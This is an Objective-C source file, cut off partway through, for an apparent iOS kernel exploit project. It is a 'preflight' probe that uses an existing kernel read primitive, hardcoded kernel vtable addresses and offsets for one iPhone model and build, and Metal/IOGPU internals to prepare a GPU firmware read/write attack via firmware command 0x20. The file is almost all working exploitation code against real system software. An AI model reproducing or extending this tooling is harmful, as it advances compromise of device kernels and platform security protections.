#import "CNDAGXFirmwarePreflightProbe.h"

#import "../kexploit/persistence.h"

#import <IOKit/IOKitLib.h>
#import <objc/runtime.h>

#include <dlfcn.h>
#include <mach/mach.h>
#include <stdbool.h>
#include <stdint.h>
#include <string.h>
#include <sys/sysctl.h>
#include <unistd.h>

@protocol CNDAGXPreflightMetalBuffer <NSObject>
- (void *)contents;
- (NSUInteger)length;
- (NSUInteger)storageMode;
- (uint64_t)gpuAddress;
- (void *)resourceRef;
- (uint32_t)resourceID;
@end

@protocol CNDAGXPreflightBlitEncoder <NSObject>
- (void)copyFromBuffer:(id<CNDAGXPreflightMetalBuffer>)sourceBuffer
          sourceOffset:(NSUInteger)sourceOffset
              toBuffer:(id<CNDAGXPreflightMetalBuffer>)destinationBuffer
     destinationOffset:(NSUInteger)destinationOffset
                  size:(NSUInteger)size;
- (void)endEncoding;
@end

@protocol CNDAGXPreflightCommandBuffer <NSObject>
- (id<CNDAGXPreflightBlitEncoder>)blitCommandEncoder;
- (void)commit;
- (void)waitUntilCompleted;
- (NSUInteger)status;
- (NSError *)error;
@end

@protocol CNDAGXPreflightCommandQueue <NSObject>
- (id<CNDAGXPreflightCommandBuffer>)commandBuffer;
@end

@protocol CNDAGXPreflightMetalDevice <NSObject>
- (NSString *)name;
- (id<CNDAGXPreflightCommandQueue>)newCommandQueue;
- (id<CNDAGXPreflightMetalBuffer>)newBufferWithLength:(NSUInteger)length
                                               options:(NSUInteger)options;
@end

typedef id<CNDAGXPreflightMetalDevice> (*CNDAGXCreateMetalDeviceFn)(void);
typedef bool (*CNDAGXCheckedReadFn)(uint64_t, void *, size_t);
typedef bool (*CNDAGXValidFn)(uint64_t);
typedef void (*CNDAGXOffsetsInitFn)(void);
typedef uint64_t (*CNDAGXTaskSelfFn)(void);
typedef uint64_t (*CNDAGXPortObjectFn)(uint64_t, mach_port_t);

typedef struct {
    CNDAGXCheckedReadFn checkedRead;
    CNDAGXValidFn valid;
    CNDAGXOffsetsInitFn offsetsInit;
    CNDAGXTaskSelfFn taskSelf;
    CNDAGXPortObjectFn portObject;
    uint32_t *ipcPortKobjectOffset;
    uint64_t *kernelBase;
    uint64_t *kernelSlide;
    uint64_t *t1sz;
    uint64_t pointerMask;
    unsigned pointerBits;
} CNDAGXPreflightAPI;

static const uint64_t CNDAGXUnslidTextBase = UINT64_C(0xfffffff007004000);
static const uint64_t CNDAGXUnslidImageWitness = UINT64_C(0xfffffff0089f36b8);
static const uint32_t CNDAGXImageWitnessInstruction = 0xd503237f;
static NSString *const CNDAGXKernelUUID =
    @"B2122F62-A1E8-3EFB-9F18-CEC47E17B34B";

static const uint64_t CNDAGXIOMachPortVtable = UINT64_C(0xfffffff007c79000);
static const uint64_t CNDAGXDeviceUserClientVtable =
    UINT64_C(0xfffffff007cd3d78);
static const uint64_t CNDAGXAcceleratorVtable =
    UINT64_C(0xfffffff007cda180);
static const uint64_t CNDAGXSharedVtable = UINT64_C(0xfffffff007cdefb8);
static const uint64_t CNDAGXGartVtable = UINT64_C(0xfffffff007cd9148);
static const uint64_t CNDAGXArmFirmwareASCVtable =
    UINT64_C(0xfffffff007cd5360);
static const uint64_t CNDAGXHostRingVtable =
    UINT64_C(0xfffffff007cd5278);
static const uint64_t CNDAGXChannelVtable0 =
    UINT64_C(0xfffffff007cd0160);
static const uint64_t CNDAGXChannelVtable1 =
    UINT64_C(0xfffffff007cd07f8);
static const uint64_t CNDAGXIOCommandGateVtable =
    UINT64_C(0xfffffff007c6f110);
static const uint64_t CNDAGXRTBuddyVtable =
    UINT64_C(0xfffffff008174848);
static const uint64_t CNDAGXRTBuddyFirmwareVtable =
    UINT64_C(0xfffffff008176938);
static const uint64_t CNDAGXRTBuddyCoredumpMapVtable =
    UINT64_C(0xfffffff008170e08);
static const uint64_t CNDAGXOSArrayVtable =
    UINT64_C(0xfffffff007c66da0);

enum {
    CNDAGXPageSize = 0x4000,
    CNDAGXSourceOffset = 0x100,
    CNDAGXIPKObjectOffset = 0x50,
    CNDAGXIOMachPortObject = 0x20,
    CNDAGXClientProvider = 0xf8,
    CNDAGXClientTask = 0x120,
    CNDAGXTaskGart = 0x58,
    CNDAGXAcceleratorFirmwareASC = 0x548,
    CNDAGXFirmwareHostRing = 0xa70,
    CNDAGXFirmwareChannel0 = 0x17f0,
    CNDAGXChannelEndpoint = 0x120,
    CNDAGXChannelRTBuddy = 0x128,
    CNDAGXChannelCommandGate = 0x138,
    CNDAGXChannelOwner = 0x160,
    CNDAGXChannelDispatchFlag = 0x179,
    CNDAGXRTBuddyFirmware = 0x21e0,
    CNDAGXRTBuddyCoredumpMap = 0xa8,
    CNDAGXCoredumpSegments = 0x20,
    CNDAGXCoredumpCPUMaps = 0x28,
    CNDAGXOSArrayCount = 0x14,
    CNDAGXOSArrayCapacity = 0x18,
    CNDAGXOSArrayBacking = 0x20,
    CNDAGXMaximumSegments = 8,
    CNDAGXMaximumCapacity = 64,
};

static const uint64_t CNDAGXFirmwareOutputTableVA =
    UINT64_C(0xfffffc0000056f08);
static const kern_return_t CNDAGXExpectedNoService =
    (kern_return_t)0xe00002c7u;

static NSString *CNDAGXHex(uint64_t value)
{
    return [NSString stringWithFormat:@"0x%016llx",
            (unsigned long long)value];
}

static NSString *CNDAGXSysctlString(const char *name)
{
    size_t length = 0;
    if (sysctlbyname(name, NULL, &length, NULL, 0) != 0 || length == 0) {
        return @"";
    }
    char *buffer = calloc(1, length);
    if (buffer == NULL) return @"";
    NSString *value = @"";
    if (sysctlbyname(name, buffer, &length, NULL, 0) == 0) {
        value = [NSString stringWithUTF8String:buffer] ?: @"";
    }
    free(buffer);
    return value;
}

static NSString *CNDAGXReportPath(void)
{
    NSString *documents = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    return documents.length > 0
        ? [documents stringByAppendingPathComponent:@"C50FirmwarePreflight.json"]
        : nil;
}

static BOOL CNDAGXPersist(NSMutableDictionary<NSString *, id> *report)
{
    if (report == nil) return NO;
    if ([report[@"persistenceFailureObserved"] boolValue]) return NO;
    report[@"updatedAt"] = @([[NSDate date] timeIntervalSince1970]);
    NSString *path = CNDAGXReportPath();
    if (path == nil) {
        report[@"reportPersistence"] = @"documents-directory-unavailable";
        report[@"persistenceFailureObserved"] = @YES;
        return NO;
    }
    report[@"reportPath"] = path;
    report[@"reportPersistence"] = @"atomic-write-completed";
    NSError *encodeError = nil;
    NSData *data = [NSJSONSerialization dataWithJSONObject:report
        options:NSJSONWritingPrettyPrinted | NSJSONWritingSortedKeys
        error:&encodeError];
    if (data == nil) {
        report[@"reportPersistence"] = @"json-encode-failed";
        report[@"reportPersistenceError"] =
            encodeError.localizedDescription ?: @"unknown";
        report[@"persistenceFailureObserved"] = @YES;
        return NO;
    }
    NSError *writeError = nil;
    BOOL written = [data writeToFile:path
                             options:NSDataWritingAtomic
                               error:&writeError];
    if (!written) {
        report[@"reportPersistence"] = @"atomic-write-failed";
        report[@"reportPersistenceError"] =
            writeError.localizedDescription ?: @"unknown";
        report[@"persistenceFailureObserved"] = @YES;
    }
    return written;
}

static BOOL CNDAGXProgress(NSMutableDictionary<NSString *, id> *report,
                           NSString *stage)
{
    NSMutableArray *events = [report[@"progress"] mutableCopy] ?:
        [NSMutableArray array];
    [events addObject:@{
        @"stage": stage ?: @"unknown",
        @"at": @([[NSDate date] timeIntervalSince1970]),
    }];
    report[@"progress"] = events;
    report[@"currentStage"] = stage ?: @"unknown";
    BOOL persisted = CNDAGXPersist(report);
    NSLog(@"[AGX_C50] stage=%@", stage ?: @"unknown");
    return persisted;
}

static NSDictionary<NSString *, id> *CNDAGXAnchorReport(
    const CNDKRWAnchorVerification *anchor, BOOL passed)
{
    if (anchor == NULL) return @{ @"passed": @NO };
    return @{
        @"metadataExact": @(anchor->metadataExact),
        @"recordCommitted": @(anchor->recordCommitted),
        @"nextProcessArmed": @(anchor->nextProcessArmed),
        @"lookupSucceeded": @(anchor->lookupSucceeded),
        @"fileportsDuplicated": @(anchor->fileportsDuplicated),
        @"fileglobExact": @(anchor->fileglobExact),
        @"stage": anchor->stage != NULL
            ? [NSString stringWithUTF8String:anchor->stage] : @"unknown",
        @"passed": @(passed),
    };
}

static void CNDAGXFinish(NSMutableDictionary<NSString *, id> *report,
                         NSString *result, NSString *generationStart,
                         void (^completion)(NSDictionary<NSString *, id> *))
{
    BOOL generationCheckRequired = generationStart.length > 0;
    BOOL generationUnchanged = NO;
    if (generationCheckRequired) {
        NSString *generationEnd =
            krw_persistence_current_generation_id() ?: @"";
        CNDKRWAnchorVerification endAnchor = {0};
        BOOL endAnchorPassed =
            krw_persistence_verify_current_generation_anchor(&endAnchor);
        generationUnchanged =
            [generationStart isEqualToString:generationEnd];
        report[@"krwGenerationEnd"] = generationEnd;
        report[@"krwGenerationUnchanged"] = @(generationUnchanged);
        report[@"krwAnchorEnd"] =
            CNDAGXAnchorReport(&endAnchor, endAnchorPassed);
        if (!generationUnchanged || !endAnchorPassed) {
            result = @"refused-generation-or-anchor-changed";
        }
    }
    report[@"krwGenerationCheckRequired"] = @(generationCheckRequired);
    if ([report[@"persistenceFailureObserved"] boolValue]) {
        result = @"refused-report-persistence-failed";
    }
    report[@"result"] = result ?: @"unknown";
    report[@"state"] = @"finished";
    report[@"finishedAt"] = @([[NSDate date] timeIntervalSince1970]);
    BOOL finalPersisted = CNDAGXProgress(report, @"finished");
    if (!finalPersisted) {
        report[@"result"] = @"refused-report-persistence-failed";
    }
    NSLog(@"[AGX_C50] finished result=%@ generationUnchanged=%@",
          report[@"result"], generationUnchanged ? @"yes" : @"no");
    if (completion != nil) completion([report copy]);
}

static bool CNDAGXResolveAPI(CNDAGXPreflightAPI *api, NSString **reason)
{
    if (api == NULL) return false;
    memset(api, 0, sizeof(*api));
    api->checkedRead = (CNDAGXCheckedReadFn)dlsym(
        RTLD_DEFAULT, "kexploit_krw_read_checked");
    api->valid = (CNDAGXValidFn)dlsym(RTLD_DEFAULT, "is_kaddr_valid");
    api->offsetsInit = (CNDAGXOffsetsInitFn)dlsym(
        RTLD_DEFAULT, "offsets_init");
    api->taskSelf = (CNDAGXTaskSelfFn)dlsym(RTLD_DEFAULT, "task_self");
    api->portObject = (CNDAGXPortObjectFn)dlsym(
        RTLD_DEFAULT, "task_get_ipc_port_object");
    api->ipcPortKobjectOffset = (uint32_t *)dlsym(
        RTLD_DEFAULT, "off_ipc_port_ip_kobject");
    api->kernelBase = (uint64_t *)dlsym(RTLD_DEFAULT, "g_kernel_base");
    api->kernelSlide = (uint64_t *)dlsym(RTLD_DEFAULT, "g_kernel_slide");
    api->t1sz = (uint64_t *)dlsym(RTLD_DEFAULT, "t1sz_boot");
    bool complete = api->checkedRead != NULL && api->valid != NULL &&
        api->offsetsInit != NULL && api->taskSelf != NULL &&
        api->portObject != NULL && api->ipcPortKobjectOffset != NULL &&
        api->kernelBase != NULL && api->kernelSlide != NULL &&
        api->t1sz != NULL;
    if (!complete) {
        if (reason != NULL) *reason = @"krw-api-incomplete";
        return false;
    }
    api->offsetsInit();
    uint64_t t1sz = *api->t1sz;
    if (t1sz == 0 || t1sz >= 64) {
        if (reason != NULL) *reason = @"invalid-t1sz";
        return false;
    }
    api->pointerBits = (unsigned)(64 - t1sz);
    if (api->pointerBits == 0 || api->pointerBits >= 64) {
        if (reason != NULL) *reason = @"invalid-pointer-width";
        return false;
    }
    api->pointerMask = (UINT64_C(1) << api->pointerBits) - 1;
    return true;
}

static uint64_t CNDAGXCanonical(const CNDAGXPreflightAPI *api,
                                uint64_t stored)
{
    if (api == NULL || stored == 0 || api->pointerBits == 0 ||
        api->pointerBits >= 64) return 0;
    uint64_t value = stored & api->pointerMask;
    uint64_t sign = UINT64_C(1) << (api->pointerBits - 1);
    if ((value & sign) != 0) value |= ~api->pointerMask;
    return api->valid(value) ? value : 0;
}

static bool CNDAGXRead(const CNDAGXPreflightAPI *api, uint64_t address,
                       void *buffer, size_t length)
{
    return api != NULL && api->checkedRead != NULL && address != 0 &&
        buffer != NULL && length > 0 &&
        api->checkedRead(address, buffer, length);
}

static bool CNDAGXRead64(const CNDAGXPreflightAPI *api, uint64_t address,
                         uint64_t *value)
{
    if (value == NULL) return false;
    *value = 0;
    return CNDAGXRead(api, address, value, sizeof(*value));
}

static bool CNDAGXRead32(const CNDAGXPreflightAPI *api, uint64_t address,
                         uint32_t *value)
{
    if (value == NULL) return false;
    *value = 0;
    return CNDAGXRead(api, address, value, sizeof(*value));
}

static bool CNDAGXRead8(const CNDAGXPreflightAPI *api, uint64_t address,
                        uint8_t *value)
{
    if (value == NULL) return false;
    *value = 0;
    return CNDAGXRead(api, address, value, sizeof(*value));
}

static bool CNDAGXReadStable64(const CNDAGXPreflightAPI *api,
                               uint64_t address, uint64_t *value)
{
    uint64_t first = 0, second = 0;
    bool passed = CNDAGXRead64(api, address, &first) &&
        CNDAGXRead64(api, address, &second) && first == second;
    if (value != NULL) *value = passed ? first : 0;
    return passed;
}

static bool CNDAGXValidateVptr(NSMutableDictionary<NSString *, id> *report,
                               const CNDAGXPreflightAPI *api,
                               NSString *key, uint64_t object,
                               uint64_t expectedUnslid, uint64_t slide,
                               BOOL pacValidated)
{
    uint64_t raw = 0;
    bool readPassed = CNDAGXRead64(api, object, &raw);
    uint64_t stripped = readPassed ? CNDAGXCanonical(api, raw) : 0;
    uint64_t expected = expectedUnslid + slide;
    bool passed = readPassed && stripped == expected;
    report[key] = @{
        @"object": CNDAGXHex(object),
        @"rawVptr": CNDAGXHex(raw),
        @"strippedVptr": CNDAGXHex(stripped),
        @"expectedVptr": CNDAGXHex(expected),
        @"stripMatches": @(stripped == expected),
        @"kernelPACValidated": @(pacValidated),
        @"passed": @(passed),
    };
    CNDAGXPersist(report);
    return passed;
}

static bool CNDAGXValidateEitherVptr(
    NSMutableDictionary<NSString *, id> *report,
    const CNDAGXPreflightAPI *api, NSString *key, uint64_t object,
    uint64_t expected0, uint64_t expected1, uint64_t slide)
{
    uint64_t raw = 0;
    bool readPassed = CNDAGXRead64(api, object, &raw);
    uint64_t stripped = readPassed ? CNDAGXCanonical(api, raw) : 0;
    bool passed = readPassed &&
        (stripped == expected0 + slide || stripped == expected1 + slide);
    report[key] = @{
        @"object": CNDAGXHex(object),
        @"rawVptr": CNDAGXHex(raw),
        @"strippedVptr": CNDAGXHex(stripped),
        @"expectedVptr0": CNDAGXHex(expected0 + slide),
        @"expectedVptr1": CNDAGXHex(expected1 + slide),
        @"kernelPACValidated": @NO,
        @"passed": @(passed),
    };
    CNDAGXPersist(report);
    return passed;
}

static bool CNDAGXReadOSArrayMetadata(
    NSMutableDictionary<NSString *, id> *report,
    const CNDAGXPreflightAPI *api, NSString *key, uint64_t array,
    uint32_t *countOut)
{
    uint32_t count0 = 0, count1 = 0, capacity0 = 0, capacity1 = 0;
    uint64_t backing0 = 0, backing1 = 0;
    bool readsPassed =
        CNDAGXRead32(api, array + CNDAGXOSArrayCount, &count0) &&
        CNDAGXRead32(api, array + CNDAGXOSArrayCapacity, &capacity0) &&
        CNDAGXRead64(api, array + CNDAGXOSArrayBacking, &backing0) &&
        CNDAGXRead32(api, array + CNDAGXOSArrayCount, &count1) &&
        CNDAGXRead32(api, array + CNDAGXOSArrayCapacity, &capacity1) &&
        CNDAGXRead64(api, array + CNDAGXOSArrayBacking, &backing1);
    bool stable = readsPassed && count0 == count1 &&
        capacity0 == capacity1 && backing0 == backing1;
    bool bounds = count0 >= 1 && count0 <= CNDAGXMaximumSegments &&
        capacity0 >= count0 && capacity0 <= CNDAGXMaximumCapacity;
    bool passed = stable && bounds && backing0 != 0;
    report[key] = @{
        @"array": CNDAGXHex(array),
        @"count": @(count0),
        @"capacity": @(capacity0),
        @"rawPACDABacking": CNDAGXHex(backing0),
        @"stable": @(stable),
        @"bounded": @(bounds),
        @"kernelPACValidated": @NO,
        @"backingPointerStripped": @NO,
        @"backingDereferenceAttempted": @NO,
        @"passed": @(passed),
    };
    CNDAGXPersist(report);
    if (countOut != NULL) *countOut = passed ? count0 : 0;
    return passed;
}

void CNDAGXFirmwarePreflightRun(
    NSString *requestID,
    void (^completion)(NSDictionary<NSString *, id> *report))
{
    NSMutableDictionary<NSString *, id> *report = [@{
        @"schema": @"com.zeroxjf.cyanide.agx-firmware-preflight",
        @"schemaVersion": @1,
        @"probeName": @"C50AGXFirmwareGFXRWPreflight",
        @"probeVersion": @"1.0.0",
        @"requestID": requestID ?: @"",
        @"runID": NSUUID.UUID.UUIDString,
        @"state": @"starting",
        @"result": @"running",
        @"createdAt": @([[NSDate date] timeIntervalSince1970]),
        @"pid": @(getpid()),
        @"capability": @"read-only identity and mapping inventory before firmware command 0x20",
        @"stopConditions": @[
            @"unsupported device or build",
            @"KRW generation or anchor mismatch",
            @"kernel image witness mismatch",
            @"Metal CPU/GPU baseline mismatch",
            @"object identity, vtable, or pointer stability failure",
            @"resource/map/firmware-domain/output/producer join remains unproved",
        ],
        @"krwPreparationOwner": @"settings_ensure_existing_krw_for_probe",
        @"krwAdmissionBehavior":
            @"reuse-live-or-owner-recover-parked-never-fresh-acquire",
        @"externalKRWActionLockScope": @"cyanide-process-local",
        @"crossProcessKRWLeaseProved": @NO,
        @"probeOwnsKRWLifecycle": @NO,
        @"kernelReadUsed": @NO,
        @"kernelWriteUsed": @NO,
        @"kernelWriteCount": @0,
        @"firmwareCommandInserted": @NO,
        @"firmwareKickAttempted": @NO,
        @"firmwareOutputReadAttempted": @NO,
        @"postReleaseAccessAttempted": @NO,
        @"pointerScanUsed": @NO,
        @"pacStrippedBackingDereferenceAttempted": @NO,
        @"resourceMapJoin": @"unproved",
        @"firmwareAddressDomainJoin": @"unproved",
        @"outputAliasEstablished": @NO,
        @"exclusiveProducerOwnership": @"unproved",
        @"command20ReadClaimed": @NO,
        @"progress": [NSMutableArray array],
    } mutableCopy];
    if (!CNDAGXProgress(report, @"identity")) {
        report[@"result"] = @"refused-report-persistence-failed";
        report[@"state"] = @"finished";
        if (completion != nil) completion([report copy]);
        return;
    }

    NSString *product = CNDAGXSysctlString("hw.machine");
    NSString *build = CNDAGXSysctlString("kern.osversion");
    NSBundle *bundle = NSBundle.mainBundle;
    report[@"deviceIdentity"] = @{
        @"productType": product,
        @"productBuildVersion": build,
        @"systemVersion": NSProcessInfo.processInfo.operatingSystemVersionString,
    };
    report[@"appIdentity"] = @{
        @"bundleIdentifier": bundle.bundleIdentifier ?: @"",
        @"shortVersion": bundle.infoDictionary[@"CFBundleShortVersionString"] ?: @"",
        @"buildNumber": bundle.infoDictionary[@"CFBundleVersion"] ?: @"",
    };
    if (![product isEqualToString:@"iPhone17,2"] ||
        ![build isEqualToString:@"23A341"]) {
        CNDAGXFinish(report, @"refused-unsupported-device", @"", completion);
        return;
    }

    NSString *generationStart =
        krw_persistence_current_generation_id() ?: @"";
    CNDKRWAnchorVerification startAnchor = {0};
    BOOL startAnchorPassed =
        krw_persistence_verify_current_generation_anchor(&startAnchor);
    report[@"krwGenerationStart"] = generationStart;
    report[@"krwAnchorStart"] =
        CNDAGXAnchorReport(&startAnchor, startAnchorPassed);
    CNDAGXPersist(report);
    if (generationStart.length == 0 || !startAnchorPassed) {
        CNDAGXFinish(report, @"refused-generation-anchor-unproved",
                     generationStart, completion);
        return;
    }

    CNDAGXPreflightAPI api;
    NSString *apiReason = nil;
    if (!CNDAGXResolveAPI(&api, &apiReason)) {
        CNDAGXFinish(report, apiReason ?: @"refused-krw-api-missing",
                     generationStart, completion);
        return;
    }
    if (*api.ipcPortKobjectOffset != CNDAGXIPKObjectOffset) {
        report[@"ipcPortKobjectOffset"] = @(*api.ipcPortKobjectOffset);
        CNDAGXFinish(report, @"refused-ip-kobject-offset-mismatch",
                     generationStart, completion);
        return;
    }
    uint64_t kernelBase = *api.kernelBase;
    uint64_t slide = *api.kernelSlide;
    report[@"kernelIdentity"] = @{
        @"pinnedExpectedInnerKernelUUID": CNDAGXKernelUUID,
        @"liveKernelUUIDVerified": @NO,
        @"kernelBase": CNDAGXHex(kernelBase),
        @"kernelSlide": CNDAGXHex(slide),
        @"t1sz": @(*api.t1sz),
        @"pointerBits": @(api.pointerBits),
    };
    if (kernelBase != CNDAGXUnslidTextBase + slide ||
        (slide & (CNDAGXPageSize - 1)) != 0) {
        CNDAGXFinish(report, @"refused-kernel-base-slide-mismatch",
                     generationStart, completion);
        return;
    }
    uint32_t imageWitness = 0;
    report[@"kernelReadUsed"] = @YES;
    if (!CNDAGXRead32(&api, CNDAGXUnslidImageWitness + slide,
                      &imageWitness) ||
        imageWitness != CNDAGXImageWitnessInstruction) {
        report[@"imageWitness"] = CNDAGXHex(imageWitness);
        CNDAGXFinish(report, @"refused-image-witness-mismatch",
                     generationStart, completion);
        return;
    }
    report[@"imageWitness"] = CNDAGXHex(imageWitness);
    if (!CNDAGXProgress(report, @"owned-metal-baseline")) {
        CNDAGXFinish(report, @"refused-report-persistence-failed",
                     generationStart, completion);
        return;
    }

    void *metalHandle = dlopen(
        "/System/Library/Frameworks/Metal.framework/Metal",
        RTLD_NOW | RTLD_LOCAL);
    CNDAGXCreateMetalDeviceFn createMetal = metalHandle != NULL
        ? (CNDAGXCreateMetalDeviceFn)dlsym(
            metalHandle, "MTLCreateSystemDefaultDevice") : NULL;
    id<CNDAGXPreflightMetalDevice> device =
        createMetal != NULL ? createMetal() : nil;
    id<CNDAGXPreflightCommandQueue> queue = [device newCommandQueue];
    id<CNDAGXPreflightMetalBuffer> source =
        [device newBufferWithLength:CNDAGXPageSize options:0];
    id<CNDAGXPreflightMetalBuffer> readback =
        [device newBufferWithLength:CNDAGXPageSize options:0];
    uint32_t nonce = UINT32_C(0xc5000000) ^ (uint32_t)getpid() ^
        (uint32_t)[NSDate.date timeIntervalSince1970];
    void *sourceContents = [source contents];
    void *readbackContents = [readback contents];
    uint64_t gpuAddress = [source respondsToSelector:@selector(gpuAddress)]
        ? [source gpuAddress] : 0;
    bool sourceStorageShared =
        [source respondsToSelector:@selector(storageMode)] &&
        [source storageMode] == 0;
    bool readbackStorageShared =
        [readback respondsToSelector:@selector(storageMode)] &&
        [readback storageMode] == 0;
    bool sourceShape = source != nil && readback != nil && queue != nil &&
        sourceContents != NULL && readbackContents != NULL &&
        [source length] == CNDAGXPageSize &&
        [readback length] == CNDAGXPageSize &&
        sourceStorageShared && readbackStorageShared &&
        gpuAddress != 0 && gpuAddress < UINT64_C(0x0001000000000000) &&
        (gpuAddress & 3) == 0 &&
        gpuAddress <= UINT64_MAX - CNDAGXSourceOffset &&
        CNDAGXSourceOffset <= CNDAGXPageSize - sizeof(uint32_t) &&
        (CNDAGXSourceOffset & 3) == 0;
    if (!sourceShape) {
        report[@"ownedBufferBaseline"] = @{
            @"metalLoaded": @(metalHandle != NULL),
            @"deviceCreated": @(device != nil),
            @"queueCreated": @(queue != nil),
            @"sourceCreated": @(source != nil),
            @"readbackCreated": @(readback != nil),
            @"gpuAddress": CNDAGXHex(gpuAddress),
            @"passed": @NO,
        };
        CNDAGXFinish(report, @"refused-owned-buffer-shape",
                     generationStart, completion);
        return;
    }
    memset(sourceContents, 0, CNDAGXPageSize);
    memset(readbackContents, 0, CNDAGXPageSize);
    memcpy((uint8_t *)sourceContents + CNDAGXSourceOffset,
           &nonce, sizeof(nonce));
    id<CNDAGXPreflightCommandBuffer> command = [queue commandBuffer];
    id<CNDAGXPreflightBlitEncoder> blit = [command blitCommandEncoder];
    [blit copyFromBuffer:source sourceOffset:CNDAGXSourceOffset
                toBuffer:readback destinationOffset:0 size:sizeof(nonce)];
    [blit endEncoding];
    [command commit];
    [command waitUntilCompleted];
    uint32_t cpuValue = 0, gpuValue = 0;
    memcpy(&cpuValue, (uint8_t *)sourceContents + CNDAGXSourceOffset,
           sizeof(cpuValue));
    memcpy(&gpuValue, readbackContents, sizeof(gpuValue));
    NSUInteger commandStatus = [command status];
    NSError *commandError = [command error];
    bool baselinePassed = blit != nil && command != nil &&
        commandStatus == 4 && commandError == nil &&
        cpuValue == nonce && gpuValue == nonce;
    report[@"ownedBufferBaseline"] = @{
        @"metalDeviceName": [device respondsToSelector:@selector(name)]
            ? ([device name] ?: @"") : @"unavailable",
        @"requestedBufferLength": @(CNDAGXPageSize),
        @"sourceBufferLength": @([source length]),
        @"readbackBufferLength": @([readback length]),
        @"storageModeSharedRequested": @YES,
        @"storageMode": [source respondsToSelector:@selector(storageMode)]
            ? @([source storageMode]) : @(-1),
        @"sourceStorageModeShared": @(sourceStorageShared),
        @"readbackStorageModeShared": @(readbackStorageShared),
        @"gpuAddress": CNDAGXHex(gpuAddress),
        @"sourceOffset": @(CNDAGXSourceOffset),
        @"effectiveSourceAddress": CNDAGXHex(
            gpuAddress + CNDAGXSourceOffset),
        @"nonce": CNDAGXHex(nonce),
        @"cpuValue": CNDAGXHex(cpuValue),
        @"ordinaryGPUReadValue": CNDAGXHex(gpuValue),
        @"commandStatus": @(commandStatus),
        @"commandError": commandError.localizedDescription ?: @"",
        @"sourceModifiedByGPU": @NO,
        @"passed": @(baselinePassed),
    };
    CNDAGXPersist(report);
    if (!baselinePassed) {
        CNDAGXFinish(report, @"refused-owned-buffer-baseline-mismatch",
                     generationStart, completion);
        return;
    }

    if (!CNDAGXProgress(report, @"resource-identity-candidate")) {
        CNDAGXFinish(report, @"refused-report-persistence-failed",
                     generationStart, completion);
        return;
    }
    Class resourceClass = NSClassFromString(@"IOGPUMetalResource");
    bool resourceClassPassed = resourceClass != Nil &&
        [(id)source isKindOfClass:resourceClass];
    void *resourceRef = resourceClassPassed &&
        [source respondsToSelector:@selector(resourceRef)]
        ? [source resourceRef] : NULL;
    void *resourceRefSecond = resourceClassPassed &&
        [source respondsToSelector:@selector(resourceRef)]
        ? [source resourceRef] : NULL;
    uint32_t wrapperResourceID = resourceClassPassed &&
        [source respondsToSelector:@selector(resourceID)]
        ? [source resourceID] : 0;
    uint32_t refResourceID = 0, refKernelHandleCandidate = 0;
    uint64_t refGPUAddress = 0;
    bool resourceRefShape = resourceRef != NULL &&
        resourceRefSecond == resourceRef &&
        (((uintptr_t)resourceRef & (sizeof(void *) - 1)) == 0);
    if (resourceRefShape) {
        const uint8_t *bytes = (const uint8_t *)resourceRef;
        memcpy(&refResourceID, bytes + 0x30, sizeof(refResourceID));
        memcpy(&refKernelHandleCandidate, bytes + 0x34,
               sizeof(refKernelHandleCandidate));
        memcpy(&refGPUAddress, bytes + 0x38, sizeof(refGPUAddress));
    }
    bool resourceCandidatePassed = resourceClassPassed && resourceRefShape &&
        wrapperResourceID != 0 && refResourceID == wrapperResourceID &&
        refGPUAddress == gpuAddress;
    report[@"ownedResourceIdentityCandidate"] = @{
        @"requiredBaseClass": @"IOGPUMetalResource",
        @"classPresent": @(resourceClass != Nil),
        @"sourceClass": NSStringFromClass([(id)source class]) ?: @"",
        @"isKindOfRequiredBaseClass": @(resourceClassPassed),
        @"resourceRef": CNDAGXHex((uintptr_t)resourceRef),
        @"resourceRefStable": @(resourceRefSecond == resourceRef),
        @"resourceRefShapePassed": @(resourceRefShape),
        @"wrapperResourceID": @(wrapperResourceID),
        @"resourceRefIDAt0x30": @(refResourceID),
        @"selector8KernelHandleCandidateAt0x34":
            @(refKernelHandleCandidate),
        @"resourceRefGPUVAAt0x38": CNDAGXHex(refGPUAddress),
        @"publicGPUVA": CNDAGXHex(gpuAddress),
        @"wrapperAndResourceRefJoined": @(resourceCandidatePassed),
        @"kernelResourceHandleRelationshipProved": @NO,
        @"selector8ClientJoinedToMetalTaskClient": @NO,
        @"passed": @(resourceCandidatePassed),
    };
    CNDAGXPersist(report);
    if (!resourceCandidatePassed) {
        CNDAGXFinish(report, @"preflight-stopped-resource-identity-candidate",
                     generationStart, completion);
        return;
    }

    if (!CNDAGXProgress(report, @"metal-client-task-gart-bridge")) {
        CNDAGXFinish(report, @"refused-report-persistence-failed",
                     generationStart, completion);
        return;
    }
    Class deviceClass = NSClassFromString(@"IOGPUMetalDevice");
    Class concreteClass = [(id)device class];
    Ivar deviceRefIvar = class_getInstanceVariable(concreteClass, "_deviceRef");
    Ivar acceleratorPortIvar = class_getInstanceVariable(
        concreteClass, "_acceleratorPort");
    ptrdiff_t deviceRefOffset = deviceRefIvar != NULL
        ? ivar_getOffset(deviceRefIvar) : -1;
    ptrdiff_t acceleratorPortOffset = acceleratorPortIvar != NULL
        ? ivar_getOffset(acceleratorPortIvar) : -1;
    const char *deviceRefType = deviceRefIvar != NULL
        ? ivar_getTypeEncoding(deviceRefIvar) : NULL;
    const char *acceleratorPortType = acceleratorPortIvar != NULL
        ? ivar_getTypeEncoding(acceleratorPortIvar) : NULL;
    bool deviceShape = deviceClass != Nil &&
        [(id)device isKindOfClass:deviceClass] &&
        deviceRefOffset == 0x278 && acceleratorPortOffset == 0x280 &&
        deviceRefType != NULL &&
        strcmp(deviceRefType, "^{__IOGPUDevice=}") == 0 &&
        acceleratorPortType != NULL && strcmp(acceleratorPortType, "I") == 0;
    const void *deviceRef = NULL;
    const void *deviceRefSecond = NULL;
    io_service_t service = IO_OBJECT_NULL;
    io_connect_t connection = IO_OBJECT_NULL;
    if (deviceShape) {
        const uint8_t *deviceBytes =
            (const uint8_t *)(__bridge const void *)device;
        memcpy(&deviceRef, deviceBytes + deviceRefOffset, sizeof(deviceRef));
        memcpy(&deviceRefSecond, deviceBytes + deviceRefOffset,
               sizeof(deviceRefSecond));
        memcpy(&service, deviceBytes + acceleratorPortOffset, sizeof(service));
    }
    bool deviceRefShape = deviceRef != NULL &&
        deviceRefSecond == deviceRef &&
        (((uintptr_t)deviceRef & (sizeof(void *) - 1)) == 0);
    deviceShape = deviceShape && deviceRefShape;
    if (deviceRefShape) {
